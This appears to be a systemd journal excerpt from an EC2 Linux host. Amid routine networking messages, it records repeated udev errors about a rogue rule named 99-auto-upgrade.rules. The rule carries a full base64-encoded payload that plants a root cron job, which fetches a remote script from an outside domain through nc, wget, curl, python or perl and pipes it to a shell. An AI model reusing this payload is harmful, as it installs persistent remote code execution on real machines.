+Feb 08 23:17:34 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 15987, but reception only permitted for main PID 614
+Feb 08 23:17:55 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16151, but reception only permitted for main PID 614
+Feb 08 23:17:55 ip-172-31-23-190 networkctl[16154]: Failed to query link DHCP leases: Unknown object '/org/freedesktop/network1/link/_3125'.
+Feb 08 23:17:55 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16154, but reception only permitted for main PID 614
+Feb 08 23:17:55 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:17:55 ip-172-31-23-190 networkctl[16157]: Interface "vethd790081" not found.
+Feb 08 23:17:55 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16212, but reception only permitted for main PID 614
+Feb 08 23:17:55 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16223, but reception only permitted for main PID 614
+Feb 08 23:18:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:18:15 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16380, but reception only permitted for main PID 614
+Feb 08 23:18:15 ip-172-31-23-190 networkctl[16391]: Interface "veth346886d" not found.
+Feb 08 23:18:15 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16391, but reception only permitted for main PID 614
+Feb 08 23:18:15 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16391, but reception only permitted for main PID 614
+Feb 08 23:18:15 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:18:15 ip-172-31-23-190 networkctl[16395]: Interface "vethbd3b6c3" not found.
+Feb 08 23:18:15 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16395, but reception only permitted for main PID 614
+Feb 08 23:18:15 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16395, but reception only permitted for main PID 614
+Feb 08 23:18:16 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16449, but reception only permitted for main PID 614
+Feb 08 23:18:16 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16457, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16621, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 networkctl[16624]: Interface "vethd130397" not found.
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16624, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16624, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 networkctl[16627]: Interface "veth80ec0eb" not found.
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16627, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16627, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16682, but reception only permitted for main PID 614
+Feb 08 23:18:36 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16695, but reception only permitted for main PID 614
+Feb 08 23:18:56 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16863, but reception only permitted for main PID 614
+Feb 08 23:18:56 ip-172-31-23-190 networkctl[16866]: Interface "veth565704b" not found.
+Feb 08 23:18:56 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16866, but reception only permitted for main PID 614
+Feb 08 23:18:56 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16866, but reception only permitted for main PID 614
+Feb 08 23:18:56 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:18:56 ip-172-31-23-190 networkctl[16869]: Interface "veth47cca46" not found.
+Feb 08 23:18:56 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16869, but reception only permitted for main PID 614
+Feb 08 23:18:56 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16869, but reception only permitted for main PID 614
+Feb 08 23:18:57 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 16938, but reception only permitted for main PID 614
+Feb 08 23:19:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:19:17 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17097, but reception only permitted for main PID 614
+Feb 08 23:19:17 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17100, but reception only permitted for main PID 614
+Feb 08 23:19:17 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:19:17 ip-172-31-23-190 networkctl[17103]: Interface "veth421a0ae" not found.
+Feb 08 23:19:17 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17103, but reception only permitted for main PID 614
+Feb 08 23:19:17 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17103, but reception only permitted for main PID 614
+Feb 08 23:19:17 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17160, but reception only permitted for main PID 614
+Feb 08 23:19:17 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17167, but reception only permitted for main PID 614
+Feb 08 23:19:38 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17330, but reception only permitted for main PID 614
+Feb 08 23:19:38 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:19:38 ip-172-31-23-190 networkctl[17333]: Interface "veth8f45aff" not found.
+Feb 08 23:19:38 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17333, but reception only permitted for main PID 614
+Feb 08 23:19:38 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17333, but reception only permitted for main PID 614
+Feb 08 23:19:38 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17341, but reception only permitted for main PID 614
+Feb 08 23:19:38 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17388, but reception only permitted for main PID 614
+Feb 08 23:19:38 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17395, but reception only permitted for main PID 614
+Feb 08 23:19:58 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17561, but reception only permitted for main PID 614
+Feb 08 23:19:58 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17564, but reception only permitted for main PID 614
+Feb 08 23:19:58 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:19:58 ip-172-31-23-190 networkctl[17567]: Interface "veth89ac603" not found.
+Feb 08 23:19:58 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17567, but reception only permitted for main PID 614
+Feb 08 23:19:58 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17567, but reception only permitted for main PID 614
+Feb 08 23:19:59 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17626, but reception only permitted for main PID 614
+Feb 08 23:20:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17798, but reception only permitted for main PID 614
+Feb 08 23:20:19 ip-172-31-23-190 networkctl[17801]: Interface "veth85fcd89" not found.
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17801, but reception only permitted for main PID 614
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17801, but reception only permitted for main PID 614
+Feb 08 23:20:19 ip-172-31-23-190 networkctl[17804]: Interface "veth1d2ea53" not found.
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17804, but reception only permitted for main PID 614
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17804, but reception only permitted for main PID 614
+Feb 08 23:20:19 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17855, but reception only permitted for main PID 614
+Feb 08 23:20:19 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 17861, but reception only permitted for main PID 614
+Feb 08 23:20:40 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18029, but reception only permitted for main PID 614
+Feb 08 23:20:40 ip-172-31-23-190 networkctl[18032]: Interface "veth851fe4a" not found.
+Feb 08 23:20:40 ip-172-31-23-190 networkctl[18035]: Interface "veth0101183" not found.
+Feb 08 23:20:40 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18035, but reception only permitted for main PID 614
+Feb 08 23:20:40 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18035, but reception only permitted for main PID 614
